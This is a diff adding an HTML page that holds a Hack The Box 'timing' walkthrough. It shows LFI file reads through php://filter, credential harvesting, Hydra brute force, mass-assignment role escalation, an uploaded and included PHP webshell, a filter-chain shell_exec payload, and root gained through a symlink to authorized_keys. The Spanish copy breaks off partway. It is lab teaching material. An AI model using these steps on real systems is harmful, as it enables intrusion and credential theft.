@@ -1,0 +1,970 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>timing | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">timing</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+
+            <!-- ========== ENGLISH ========== -->
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+
+                    <p>The target exposed a PHP web application on port 80 with a login page. Directory fuzzing revealed
+                        an <code>image.php</code> endpoint that accepted a file path via the <code>img</code> query
+                        parameter — effectively an LFI vulnerability. Path traversal was blocked by a filter, but the
+                        restriction was bypassed using <code>php://filter</code> wrappers with an absolute path,
+                        allowing arbitrary file reads.</p>
+
+                    <p>Reading the application's source files through LFI revealed credentials stored in
+                        <code>db_conn.php</code>, a timing-based username enumeration flaw in
+                        <code>login.php</code>, and a mass assignment vulnerability in the profile update logic.
+                        By injecting <code>role=1</code> into the profile update request, admin access was obtained,
+                        unlocking a file upload endpoint.</p>
+
+                    <p>The upload handler was reverse-engineered to predict the output filename — it used a hardcoded
+                        string literal instead of a variable in the hash, making the resulting filename fully
+                        reproducible from the HTTP response's <code>Date</code> header. A PHP webshell was uploaded
+                        with a <code>.jpg</code> extension and then executed via the LFI endpoint, achieving remote
+                        code execution as <code>www-data</code>. Outbound connections were firewalled, so a simple
+                        curl-based command wrapper was used to interact with the system.</p>
+
+                    <p>A backup archive at <code>/opt/source-files-backup.zip</code> contained a <code>.git</code>
+                        directory. Inspecting the commit history revealed a previous database password in an older
+                        version of <code>db_conn.php</code>. This password worked for SSH access as
+                        <code>aaron</code>.</p>
+
+                    <p>Privilege escalation was achieved through a <code>sudo</code> permission on
+                        <code>/usr/bin/netutils</code>, a script wrapping a Java application that could download files
+                        over HTTP as root. A symlink was created in Aaron's home directory pointing
+                        <code>authorized_keys</code> to <code>/root/.ssh/authorized_keys</code>. Serving a crafted
+                        <code>authorized_keys</code> file from an HTTP server and triggering the download through
+                        <code>netutils</code> caused root to write the attacker's public SSH key into its own
+                        <code>authorized_keys</code> file, granting direct SSH access as root.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconnaissance</h2>
+                <p>Starting with an nmap scan to identify open ports and running services:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#569cd6;">22/tcp</span>  open  ssh   <span style="color:#ce9178;">OpenSSH 7.6p1 Ubuntu 4ubuntu0.5</span>
+<span style="color:#569cd6;">80/tcp</span>  open  http  <span style="color:#ce9178;">Apache httpd 2.4.29 ((Ubuntu))</span>
+| http-title: Simple WebApp
+|_ Requested resource was ./login.php</code></pre>
+
+                <p>Only two ports are open: SSH on 22 and an Apache HTTP server on 80. WhatWeb provides a bit more
+                    context about the web stack:</p>
+
+                <pre><code class="language-plaintext">http://10.129.2.206/login.php [200 OK] Apache[2.4.29], Bootstrap,
+Email[dkstudioin@gmail.com], PHP, jQuery, Title[Simple WebApp]</code></pre>
+
+                <p>The important takeaway here is that the application is PHP-based and running on Apache — both will
+                    be relevant later.</p>
+
+                <h2>Web Enumeration</h2>
+                <p>The site initially only shows a login form. Fuzzing with gobuster reveals the following paths:</p>
+
+                <pre><code class="language-plaintext">images          (Status: 301)
+css             (Status: 301)
+upload.php      (Status: 302) --> ./login.php
+<span style="color:#4ec9b0;">image.php</span>       (Status: 200) [Size: 0]
+profile.php     (Status: 302) --> ./login.php
+index.php       (Status: 302) --> ./login.php
+logout.php      (Status: 302) --> ./login.php
+js              (Status: 301)
+header.php      (Status: 302) --> ./login.php
+footer.php      (Status: 200) [Size: 3937]
+server-status   (Status: 403)
+db_conn.php     (Status: 200) [Size: 0]</code></pre>
+
+                <p>Most endpoints redirect to <code>login.php</code>, but <code>image.php</code> stands out — it
+                    returns a <code>200</code> with an empty body, suggesting it might load content based on query
+                    parameters. Since the app is PHP-based, it's likely using <code>include()</code> or similar to
+                    serve image data.</p>
+
+                <p>To confirm this, I fuzz for valid parameter names using a known image that exists on the server
+                    (<code>images/user-icon.png</code>) as the reference value, filtering out empty responses:</p>
+
+                <pre><code class="language-bash">wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
+  -u "http://10.129.2.206/image.php?FUZZ=images/user-icon.png" --hh 0</code></pre>
+
+                <pre><code class="language-plaintext">000002803:   200        213 L    1501 W   36611 Ch   <span style="color:#4ec9b0;">"img"</span></code></pre>
+
+                <p>The <code>img</code> parameter loads image data successfully:</p>
+
+                <img src="./media/image4.png" alt="Response from image.php showing raw image data loaded via the img parameter" />
+
+                <p>Importantly, when I pass a PHP file like <code>login.php</code> as the value, the page renders its
+                    HTML output rather than its source code — meaning the server is doing an <code>include()</code>,
+                    not just a file read. This is a classic Local File Inclusion (LFI) vulnerability.</p>
+
+                <h2>LFI — Filter Bypass and File Disclosure</h2>
+                <p>Attempting a standard path traversal is blocked immediately:</p>
+
+                <pre><code class="language-plaintext">http://10.129.1.80/image.php?img=../../../../../etc/hostname
+→ Hacking attempt detected!</code></pre>
+
+                <p>Double URL encoding the slashes (<code>%252F</code>) doesn't work either — the server either
+                    decodes it before the check or the filter is smart enough to catch it.</p>
+
+                <p>However, using <code>php://filter</code> with an absolute path sidesteps the filter entirely, since
+                    there are no <code>../</code> sequences involved:</p>
+
+                <pre><code class="language-bash">curl "http://10.129.1.80/image.php?img=php://filter/convert.base64-encode/resource=/etc/hostname"</code></pre>
+
+                <pre><code class="language-plaintext">dGltaW5nCg==</code></pre>
+
+                <pre><code class="language-bash">echo "dGltaW5nCg==" | base64 -d
+# timing</code></pre>
+
+                <p>There's also a trick with non-existent filter names — PHP silently ignores unknown filters and still
+                    resolves the resource, so the content comes back unencoded and in plain text (though this doesn't
+                    always work depending on the content type):</p>
+
+                <pre><code class="language-bash">http://10.129.1.80/image.php?img=php://filter/convert.base64-xd/resource=/etc/hostname
+# timing</code></pre>
+
+                <p>From <code>/etc/passwd</code>, I identify a user named <code>aaron</code>. Reading the Apache
+                    default site config confirms the document root and log paths:</p>
+
+                <pre><code class="language-bash">view-source:http://10.129.1.80/image.php?img=php://filter/convert.base64-xd/resource=/etc/apache2/sites-available/000-default.conf</code></pre>
+
+                <pre><code class="language-apache"><span style="color:#569cd6;">DocumentRoot</span> <span style="color:#ce9178;">/var/www/html</span>
+<span style="color:#569cd6;">ErrorLog</span>    <span style="color:#ce9178;">${APACHE_LOG_DIR}/error.log</span>
+<span style="color:#569cd6;">CustomLog</span>   <span style="color:#ce9178;">${APACHE_LOG_DIR}/access.log</span> combined</code></pre>
+
+                <p>For PHP files, the non-existent filter trick doesn't work reliably since the PHP code gets executed
+                    rather than returned as text. The base64 filter is the right approach here — pipe through
+                    <code>base64 -d</code> locally to read the source:</p>
+
+                <pre><code class="language-bash">curl "http://10.129.1.80/image.php?img=php://filter/convert.base64-encode/resource=/var/www/html/db_conn.php" | base64 -d</code></pre>
+
+                <pre><code class="language-php"><span style="color:#569cd6;">&lt;?php</span>
+<span style="color:#9cdcfe;">$pdo</span> = <span style="color:#dcdcaa;">new PDO</span>(<span style="color:#ce9178;">'mysql:host=localhost;dbname=app'</span>, <span style="color:#ce9178;">'root'</span>, <span style="color:#ce9178;">'4_V3Ry_l0000n9_p422w0rd'</span>);
+</code></pre>
+
+                <p>Database credentials found. Now reading <code>login.php</code> to understand the application
+                    logic:</p>
+
+                <pre><code class="language-bash">curl "http://10.129.1.80/image.php?img=php://filter/convert.base64-encode/resource=/var/www/html/login.php" | base64 -d</code></pre>
+
+                <pre><code class="language-php"><span style="color:#569cd6;">&lt;?php</span>
+<span style="color:#c586c0;">function</span> <span style="color:#dcdcaa;">createTimeChannel</span>()
+{
+    <span style="color:#dcdcaa;">sleep</span>(<span style="color:#b5cea8;">1</span>);
+}
+
+<span style="color:#c586c0;">if</span> (<span style="color:#dcdcaa;">isset</span>(<span style="color:#9cdcfe;">$_GET</span>[<span style="color:#ce9178;">'login'</span>])) {
+    <span style="color:#9cdcfe;">$username</span> = <span style="color:#9cdcfe;">$_POST</span>[<span style="color:#ce9178;">'user'</span>];
+    <span style="color:#9cdcfe;">$password</span> = <span style="color:#9cdcfe;">$_POST</span>[<span style="color:#ce9178;">'password'</span>];
+
+    <span style="color:#9cdcfe;">$statement</span> = <span style="color:#9cdcfe;">$pdo</span>-&gt;<span style="color:#dcdcaa;">prepare</span>(<span style="color:#ce9178;">"SELECT * FROM users WHERE username = :username"</span>);
+    <span style="color:#9cdcfe;">$result</span>    = <span style="color:#9cdcfe;">$statement</span>-&gt;<span style="color:#dcdcaa;">execute</span>(<span style="color:#dcdcaa;">array</span>(<span style="color:#ce9178;">'username'</span> =&gt; <span style="color:#9cdcfe;">$username</span>));
+    <span style="color:#9cdcfe;">$user</span>      = <span style="color:#9cdcfe;">$statement</span>-&gt;<span style="color:#dcdcaa;">fetch</span>();
+
+    <span style="color:#c586c0;">if</span> (<span style="color:#9cdcfe;">$user</span> !== <span style="color:#569cd6;">false</span>) {
+        <span style="color:#dcdcaa;">createTimeChannel</span>();   <span style="color:#6a9955;">// 1-second delay only when user exists</span>
+        <span style="color:#c586c0;">if</span> (<span style="color:#dcdcaa;">password_verify</span>(<span style="color:#9cdcfe;">$password</span>, <span style="color:#9cdcfe;">$user</span>[<span style="color:#ce9178;">'password'</span>])) {
+            <span style="color:#9cdcfe;">$_SESSION</span>[<span style="color:#ce9178;">'userid'</span>] = <span style="color:#9cdcfe;">$user</span>[<span style="color:#ce9178;">'id'</span>];
+            <span style="color:#9cdcfe;">$_SESSION</span>[<span style="color:#ce9178;">'role'</span>]   = <span style="color:#9cdcfe;">$user</span>[<span style="color:#ce9178;">'role'</span>];
+            <span style="color:#dcdcaa;">header</span>(<span style="color:#ce9178;">'Location: ./index.php'</span>);
+            <span style="color:#c586c0;">return</span>;
+        }
+    }
+    <span style="color:#9cdcfe;">$errorMessage</span> = <span style="color:#ce9178;">"Invalid username or password entered"</span>;
+}
+</code></pre>
+
+                <p>The <code>createTimeChannel()</code> function introduces a 1-second delay, but only when the queried
+                    username exists in the database. If the user doesn't exist, the response is immediate. This is a
+                    textbook timing side-channel: valid usernames take ~1 second to respond, invalid ones respond
+                    instantly.</p>
+
+                <p>Testing with known candidate usernames confirms that both <code>admin</code> and <code>aaron</code>
+                    exist. Running Hydra against both while also testing manually:</p>
+
+                <pre><code class="language-bash">hydra -L &lt;(echo -e "aaron\nadmin") \
+  -P /usr/share/wordlists/rockyou.txt \
+  10.129.1.80 http-post-form \
+  "/login.php?login=true:user=^USER^&password=^PASS^:F=Invalid" \
+  -t 64</code></pre>
+
+                <p>The credentials <code>aaron</code> / <code>aaron</code> work. Logging in reveals the application
+                    interface.</p>
+
+                <h2>Mass Assignment — Escalating to Admin</h2>
+
+                <img src="./media/image1.png" alt="Login page of the Simple WebApp PHP application" />
+
+                <p>After logging in, there's a profile page where the user can update their details:</p>
+
+                <img src="./media/image3.png" alt="Profile update page showing editable fields for firstName, lastName, email and company" />
+
+                <p>The profile update is processed by <code>profile_update.php</code>. Reading its source via the LFI
+                    reveals something interesting — the <code>role</code> field is processed directly from POST data
+                    without any authorisation check:</p>
+
+                <pre><code class="language-php"><span style="color:#c586c0;">if</span> (<span style="color:#dcdcaa;">isset</span>(<span style="color:#9cdcfe;">$_POST</span>[<span style="color:#ce9178;">'role'</span>])) {
+    <span style="color:#9cdcfe;">$role</span> = <span style="color:#9cdcfe;">$_POST</span>[<span style="color:#ce9178;">'role'</span>];
+    <span style="color:#9cdcfe;">$_SESSION</span>[<span style="color:#ce9178;">'role'</span>] = <span style="color:#9cdcfe;">$role</span>;
+}</code></pre>
+
+                <p>Classic mass assignment — the server blindly assigns any user-supplied <code>role</code> value to
+                    the session. Intercepting the profile update request and appending <code>&role=1</code> to the POST
+                    body is all it takes:</p>
+
+                <pre><code class="language-plaintext">firstName=test&lastName=test&email=test&company=test<span style="color:#4ec9b0;">&role=1</span></code></pre>
+
+                <p>The session is now set to role 1 (admin), which unlocks a new endpoint:
+                    <code>/avatar_uploader.php</code>.</p>
+
+                <h2>File Upload — Reverse Engineering the Filename</h2>
+                <p>The avatar uploader calls <code>upload.php</code>. Reading its source via LFI:</p>
+
+                <pre><code class="language-php"><span style="color:#569cd6;">&lt;?php</span>
+<span style="color:#dcdcaa;">include</span>(<span style="color:#ce9178;">"admin_auth_check.php"</span>);
+
+<span style="color:#9cdcfe;">$upload_dir</span> = <span style="color:#ce9178;">"images/uploads/"</span>;
+
+<span style="color:#c586c0;">if</span> (!<span style="color:#dcdcaa;">file_exists</span>(<span style="color:#9cdcfe;">$upload_dir</span>)) {
+    <span style="color:#dcdcaa;">mkdir</span>(<span style="color:#9cdcfe;">$upload_dir</span>, <span style="color:#b5cea8;">0777</span>, <span style="color:#569cd6;">true</span>);
+}
+
+<span style="color:#9cdcfe;">$file_hash</span> = <span style="color:#dcdcaa;">uniqid</span>();
+<span style="color:#9cdcfe;">$file_name</span> = <span style="color:#dcdcaa;">md5</span>(<span style="color:#ce9178;">'$file_hash'</span> . <span style="color:#dcdcaa;">time</span>()) . <span style="color:#ce9178;">'_'</span> . <span style="color:#dcdcaa;">basename</span>(<span style="color:#9cdcfe;">$_FILES</span>[<span style="color:#ce9178;">"fileToUpload"</span>][<span style="color:#ce9178;">"name"</span>]);
+<span style="color:#9cdcfe;">$target_file</span> = <span style="color:#9cdcfe;">$upload_dir</span> . <span style="color:#9cdcfe;">$file_name</span>;
+
+<span style="color:#9cdcfe;">$imageFileType</span> = <span style="color:#dcdcaa;">strtolower</span>(<span style="color:#dcdcaa;">pathinfo</span>(<span style="color:#9cdcfe;">$target_file</span>, <span style="color:#569cd6;">PATHINFO_EXTENSION</span>));
+
+<span style="color:#c586c0;">if</span> (<span style="color:#dcdcaa;">isset</span>(<span style="color:#9cdcfe;">$_POST</span>[<span style="color:#ce9178;">"submit"</span>])) {
+    <span style="color:#9cdcfe;">$check</span> = <span style="color:#dcdcaa;">getimagesize</span>(<span style="color:#9cdcfe;">$_FILES</span>[<span style="color:#ce9178;">"fileToUpload"</span>][<span style="color:#ce9178;">"tmp_name"</span>]);
+    <span style="color:#c586c0;">if</span> (<span style="color:#9cdcfe;">$check</span> === <span style="color:#569cd6;">false</span>) {
+        <span style="color:#9cdcfe;">$error</span> = <span style="color:#ce9178;">"Invalid file"</span>;
+    }
+}
+
+<span style="color:#c586c0;">if</span> (<span style="color:#9cdcfe;">$imageFileType</span> != <span style="color:#ce9178;">"jpg"</span>) {
+    <span style="color:#9cdcfe;">$error</span> = <span style="color:#ce9178;">"This extension is not allowed."</span>;
+}
+
+<span style="color:#c586c0;">if</span> (<span style="color:#dcdcaa;">empty</span>(<span style="color:#9cdcfe;">$error</span>)) {
+    <span style="color:#c586c0;">if</span> (<span style="color:#dcdcaa;">move_uploaded_file</span>(<span style="color:#9cdcfe;">$_FILES</span>[<span style="color:#ce9178;">"fileToUpload"</span>][<span style="color:#ce9178;">"tmp_name"</span>], <span style="color:#9cdcfe;">$target_file</span>)) {
+        <span style="color:#c586c0;">echo</span> <span style="color:#ce9178;">"The file has been uploaded."</span>;
+    }
+}
+</code></pre>
+
+                <p>Two things stand out. First, uploads are restricted to <code>.jpg</code> extension. Second — and
+                    critically — the filename generation has a bug:</p>
+
+                <pre><code class="language-php"><span style="color:#9cdcfe;">$file_hash</span> = <span style="color:#dcdcaa;">uniqid</span>();
+<span style="color:#9cdcfe;">$file_name</span> = <span style="color:#dcdcaa;">md5</span>(<span style="color:#ce9178;">'$file_hash'</span> . <span style="color:#dcdcaa;">time</span>()) . ...</code></pre>
+
+                <p>Notice that <code>'$file_hash'</code> is in single quotes — it's a string literal, not a variable
+                    interpolation. PHP does not expand variables inside single-quoted strings, so <code>$file_hash</code>
+                    is literally the string <code>$file_hash</code>, not the result of <code>uniqid()</code>. This
+                    means the hash is entirely deterministic: <code>md5("$file_hash" . time())</code>, where
+                    <code>time()</code> is the only unknown — and that can be read directly from the HTTP response's
+                    <code>Date</code> header.</p>
+
+                <p>The restriction to <code>.jpg</code> is not a problem either, because the LFI endpoint
+                    <code>include()</code>s whatever file path is given — PHP code embedded in a
+                    <code>.jpg</code> file will still execute when included.</p>
+
+                <p>The plan: upload a PHP webshell with a <code>.jpg</code> extension and then trigger it through the
+                    LFI. To do this, I need to predict the resulting filename.</p>
+
+                <p>After uploading a test file, the HTTP response contains the server time in the <code>Date</code>
+                    header. I convert it to a Unix timestamp using PHP's interactive shell:</p>
+
+                <pre><code class="language-bash">php --interactive</code></pre>
+
+                <pre><code class="language-php">php &gt; <span style="color:#c586c0;">echo</span> <span style="color:#dcdcaa;">strtotime</span>(<span style="color:#ce9178;">"Wed, 18 Feb 2026 17:36:06 GMT"</span>);
+<span style="color:#b5cea8;">1771436166</span>
+
+php &gt; <span style="color:#c586c0;">echo</span> <span style="color:#dcdcaa;">md5</span>(<span style="color:#ce9178;">'$file_hash'</span> . <span style="color:#dcdcaa;">strtotime</span>(<span style="color:#ce9178;">"Wed, 18 Feb 2026 17:36:06 GMT"</span>)) . <span style="color:#ce9178;">'_xd.jpg'</span>;
+<span style="color:#4ec9b0;">29f34b4751ffc1f6b4b7071dc9b636ff_xd.jpg</span></code></pre>
+
+                <p>Confirming the webshell executes via the LFI:</p>
+
+                <pre><code class="language-bash">curl "http://10.129.1.80/image.php?cmd=id&img=php://filter/convert.base64-xd/resource=/var/www/html/images/uploads/29f34b4751ffc1f6b4b7071dc9b636ff_xd.jpg"</code></pre>
+
+                <pre><code class="language-plaintext">uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
+
+                <p>RCE confirmed. Attempting reverse shells (both standard bash and busybox netcat) produces no
+                    connection — outbound traffic appears to be blocked by a firewall. Since I can't get a callback,
+                    I'll work with a simple curl-based command wrapper instead:</p>
+
+                <pre><code class="language-bash"><span style="color:#6a9955;">#!/bin/bash</span>
+<span style="color:#6a9955;"># command.sh — sends a command to the webshell and prints the output</span>
+curl -G <span style="color:#ce9178;">"http://10.129.1.80/image.php"</span> \
+  --data-urlencode <span style="color:#ce9178;">"cmd=<span style="color:#9cdcfe;">$1</span>"</span> \
+  --data-urlencode <span style="color:#ce9178;">"img=php://filter/convert.base64-xd/resource=/var/www/html/images/uploads/29f34b4751ffc1f6b4b7071dc9b636ff_xd.jpg"</span></code></pre>
+
+                <p>For a proper interactive shell without outbound connections, a
+                    <a href="https://github.com/IppSec/forward-shell">forward shell like IppSec's</a> would be the
+                    ideal tool here — it simulates a shell session entirely over inbound HTTP requests.</p>
+
+                <h2>LFI via PHP Filter Chains (Unintended Path)</h2>
+                <p>It's worth noting that this machine — released in December 2021 — is also vulnerable to an
+                    unintended exploitation path: PHP filter chain RCE. This technique was published by loknop on
+                    30 December 2021 in
+                    <a href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d">this gist</a>, and later
+                    automated by Synacktiv in their
+                    <a href="https://github.com/synacktiv/php_filter_chain_generator">php_filter_chain_generator</a>
+                    tool.</p>
+
+                <p>The technique abuses PHP's <code>php://filter</code> wrappers to chain multiple encoding
+                    conversions in sequence, constructing an arbitrary string from nothing — effectively synthesising
+                    PHP code without writing any file. When the resulting chain is passed to an <code>include()</code>
+                    call, the generated code gets executed:</p>
+
+                <pre><code class="language-bash">python3 php_filter_chain_generator --chain <span style="color:#ce9178;">'&lt;?php echo shell_exec($_GET["cmd"]);?&gt;'</span></code></pre>
+
+                <pre><code class="language-plaintext">[+] The following gadget chain will generate the following code :
+    &lt;?php echo shell_exec($_GET["cmd"]);?&gt;
+    (base64 value: PD9waHAgZWNobyBzaGVsbF9leGVjKCRfR0VUWyJjbWQiXSk7Pz4)
+
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF(...)
+</code></pre>
+
+                <img src="./media/image2.png" alt="PHP filter chain generator output showing the generated chain that synthesises a PHP webshell via LFI" />
+
+                <p>This would give immediate RCE through the LFI alone, without needing to touch the file upload at
+                    all. However, since it's an unintended path, the rest of this walkthrough follows the intended
+                    route.</p>
+
+                <h2>Git History — Credential Discovery</h2>
+                <p>Browsing the filesystem with the command wrapper reveals an interesting file in
+                    <code>/opt</code>:</p>
+
+                <pre><code class="language-bash">./command.sh "ls -lah /opt"</code></pre>
+
+                <pre><code class="language-plaintext">total 624K
+drwxr-xr-x  2 root root 4.0K Dec  2 2021 .
+drwxr-xr-x 24 root root 4.0K Nov 29 2021 ..
+-rw-r--r--  1 root root 614K Jul 20 2021 <span style="color:#4ec9b0;">source-files-backup.zip</span></code></pre>
+
+                <p>Downloading it via the LFI (the <code>php://filter</code> trick also works for binary files):</p>
+
+                <pre><code class="language-bash">curl "http://10.129.1.80/image.php?cmd=id&img=php://filter/convert.base64-xd/resource=/opt/source-files-backup.zip" \
+  --output source-files.zip</code></pre>
+
+                <p>Extracting the archive reveals a <code>backup/</code> folder containing a <code>.git</code>
+                    directory. Checking the commit history:</p>
+
+                <pre><code class="language-bash">git log --oneline</code></pre>
+
+                <p>There are two commits — the initial one and one other. Diffing the non-initial commit against the
+                    first reveals a changed password in <code>db_conn.php</code>:</p>
+
+                <pre><code class="language-php"><span style="color:#569cd6;">&lt;?php</span>
+<span style="color:#9cdcfe;">$pdo</span> = <span style="color:#dcdcaa;">new PDO</span>(<span style="color:#ce9178;">'mysql:host=localhost;dbname=app'</span>, <span style="color:#ce9178;">'root'</span>, <span style="color:#ce9178;">'S3cr3t_unGu3ss4bl3_p422w0Rd'</span>);
+</code></pre>
+
+                <p>The current <code>db_conn.php</code> on the live server uses a different (weaker) password, but this
+                    older one might have been reused elsewhere. Testing it for SSH as <code>aaron</code>:</p>
+
+                <pre><code class="language-bash">ssh aaron@10.129.1.80</code></pre>
+
+                <p>Credentials <code>aaron:S3cr3t_unGu3ss4bl3_p422w0Rd</code> work. User flag obtained.</p>
+
+                <h2>Privilege Escalation — netutils Write-As-Root via Symlink</h2>
+                <p>Checking sudo permissions for <code>aaron</code>:</p>
+
+                <pre><code class="language-bash">sudo -l</code></pre>
+
+                <pre><code class="language-plaintext">User aaron may run the following commands on timing:
+    (ALL) NOPASSWD: <span style="color:#4ec9b0;">/usr/bin/netutils</span></code></pre>
+
+                <pre><code class="language-bash">file /usr/bin/netutils</code></pre>
+
+                <pre><code class="language-plaintext">/usr/bin/netutils: Bourne-Again shell script, ASCII text executable</code></pre>
+
+                <pre><code class="language-bash">cat /usr/bin/netutils</code></pre>
+
+                <pre><code class="language-bash"><span style="color:#6a9955;">#! /bin/bash</span>
+java -jar /root/netutils.jar</code></pre>
+
+                <p>The script runs a Java JAR that lives in <code>/root</code> — not readable directly. Running it to
+                    see what it does:</p>
+
+                <pre><code class="language-plaintext">netutils v0.1
+Select one option:
+[0] FTP
+[1] HTTP
+[2] Quit</code></pre>
+
+                <p>Two download options. Testing the FTP option first — setting up a quick FTP server with
+                    <code>pyftpdlib</code>:</p>
+
+                <pre><code class="language-bash">python3 -m pyftpdlib</code></pre>
+
+                <pre><code class="language-plaintext">>>> starting FTP server on 0.0.0.0:2121, pid=15856 <<<
+10.129.1.80:38518-[anonymous] RETR /home/.../xd.jpg completed=1 bytes=30</code></pre>
+
+                <p>The FTP option downloads the file, but nothing further happens with it — no visible output file is
+                    created.</p>
+
+                <p>The HTTP option behaves differently. When I point it at my HTTP server, it downloads the file and
+                    writes it to disk using the filename from the URL path:</p>
+
+                <pre><code class="language-plaintext">Input >> 1
+Enter Url: http://10.10.14.98
+Initializing download: http://10.10.14.98
+File size: 667 bytes
+Opening output file <span style="color:#4ec9b0;">default</span>
+Starting download
+Downloaded 667 byte in 0 seconds. (6.50 KB/s)</code></pre>
+
+                <pre><code class="language-bash">ls -la</code></pre>
+
+                <pre><code class="language-plaintext">-rw-r--r-- 1 root root 667 Feb 18 18:19 <span style="color:#4ec9b0;">default</span></code></pre>
+
+                <p>The file is written as <strong>root</strong>, into the current working directory, with the filename
+                    derived from the URL path. If I request <code>http://10.10.14.98/asd.txt</code>, it writes a file
+                    called <code>asd.txt</code>. This is arbitrary file write as root — limited to the current
+                    directory, but that's enough.</p>
+
+                <p>The exploit is a symlink attack. I create a symlink in Aaron's home directory with the name
+                    <code>authorized_keys</code> pointing to <code>/root/.ssh/authorized_keys</code>. When
+                    <code>netutils</code> writes a file named <code>authorized_keys</code> to the current directory, it
+                    follows the symlink and writes to the real root SSH authorized keys file instead:</p>
+
+                <pre><code class="language-bash">ln -s /root/.ssh/authorized_keys ~/authorized_keys</code></pre>
+
+                <p>On my local machine I prepare a file named <code>authorized_keys</code> containing my SSH public
+                    key, then serve it with a Python HTTP server:</p>
+
+                <pre><code class="language-bash">python3 -m http.server 8000</code></pre>
+
+                <p>Now triggering the download via <code>netutils</code>:</p>
+
+                <pre><code class="language-plaintext">Input >> 1
+Enter Url: http://10.10.14.98:8000/authorized_keys
+Initializing download: http://10.10.14.98:8000/authorized_keys
+File size: 93 bytes
+Opening output file <span style="color:#4ec9b0;">authorized_keys</span>
+Starting download
+Downloaded 93 byte in 0 seconds. (0.90 KB/s)</code></pre>
+
+                <pre><code class="language-plaintext">10.129.1.80 - - "GET /authorized_keys HTTP/1.0" 200 -</code></pre>
+
+                <p>The download completes and <code>netutils</code> writes to <code>~/authorized_keys</code> — which
+                    resolves through the symlink to <code>/root/.ssh/authorized_keys</code>. My public key is now
+                    authorised for root login:</p>
+
+                <pre><code class="language-bash">ssh -i id_rsa root@10.129.1.80</code></pre>
+
+                <p>Root access confirmed. Root flag obtained.</p>
+            </div>
+
+            <!-- ========== ESPAÑOL ========== -->
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+
+                    <p>El objetivo exponía una aplicación web PHP en el puerto 80 con una página de login. Fuzzeando
+                        directorios se descubrió un endpoint <code>image.php</code> que aceptaba una ruta de archivo
+                        mediante el parámetro <code>img</code> — efectivamente una vulnerabilidad LFI. El path
+                        traversal estaba bloqueado por un filtro, pero la restricción se eludió usando wrappers
+                        <code>php://filter</code> con ruta absoluta, permitiendo leer archivos arbitrarios del
+                        sistema.</p>
+
+                    <p>Leyendo el código fuente de la aplicación a través del LFI se encontraron credenciales
+                        almacenadas en <code>db_conn.php</code>, un fallo de enumeración de usuarios basado en timing
+                        en <code>login.php</code>, y una vulnerabilidad de mass assignment en la lógica de
+                        actualización del perfil. Inyectando <code>role=1</code> en la petición de actualización, se
+                        obtuvo acceso de administrador y se desbloqueó un endpoint de subida de archivos.</p>
+
+                    <p>El handler de subida fue analizado en detalle para predecir el nombre del archivo resultante —
+                        usaba un string literal en lugar de una variable en el hash, haciendo que el nombre fuera
+                        completamente reproducible a partir de la cabecera <code>Date</code> de la respuesta HTTP.
+                        Se subió una webshell PHP con extensión <code>.jpg</code> y se ejecutó a través del endpoint
+                        LFI, logrando RCE como <code>www-data</code>. Las conexiones salientes estaban bloqueadas por
+                        firewall, así que se usó un wrapper de comandos basado en curl para interactuar con el
+                        sistema.</p>
+
+                    <p>Un archivo de backup en <code>/opt/source-files-backup.zip</code> contenía un directorio
+                        <code>.git</code>. Inspeccionando el historial de commits se encontró una contraseña anterior
+                        en una versión antigua de <code>db_conn.php</code>. Esa contraseña funcionó para acceder por
+                        SSH como <code>aaron</code>.</p>
+
+                    <p>La escalada de privilegios se consiguió mediante un permiso <code>sudo</code> sobre
+                        <code>/usr/bin/netutils</code>, un script que ejecuta una aplicación Java capaz de descargar
+                        archivos por HTTP como root. Se creó un enlace simbólico en el directorio de Aaron que apuntaba
+                        <code>authorized_keys</code> hacia <code>/root/.ssh/authorized_keys</code>. Al servir un
+                        archivo <code>authorized_keys</code> propio desde un servidor HTTP y descargarlo con
+                        <code>netutils</code>, root escribió la clave pública del atacante en su propio fichero de
+                        claves autorizadas, otorgando acceso SSH directo como root.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios en ejecución:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#569cd6;">22/tcp</span>  open  ssh   <span style="color:#ce9178;">OpenSSH 7.6p1 Ubuntu 4ubuntu0.5</span>
+<span style="color:#569cd6;">80/tcp</span>  open  http  <span style="color:#ce9178;">Apache httpd 2.4.29 ((Ubuntu))</span>
+| http-title: Simple WebApp
+|_ Requested resource was ./login.php</code></pre>
+
+                <p>Solo hay dos puertos abiertos: SSH en el 22 y un servidor Apache HTTP en el 80. WhatWeb
+                    proporciona algo más de contexto sobre la pila tecnológica:</p>
+
